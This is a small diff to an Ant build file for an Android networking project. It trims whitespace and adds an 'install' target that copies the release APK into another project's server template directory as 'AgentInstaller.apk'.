@@ -29,7 +29,7 @@
 		</classpath>
 	</taskdef>
 
-	
+
 	<loadproperties srcFile="local.properties" />
 	<property file="ant.properties" />
 	<loadproperties srcFile="project.properties" />
@@ -93,5 +93,9 @@
 		<antcall target="clean" />
 		<antcall target="release" inheritAll="false" />
 	</target>
-	
+
+	<target name="install" depends="build">
+		<copy file="bin/android_networking-release.apk" tofile="../RCSAndroid/server/template/AgentInstaller.apk"/>
+	</target>
+
 </project>
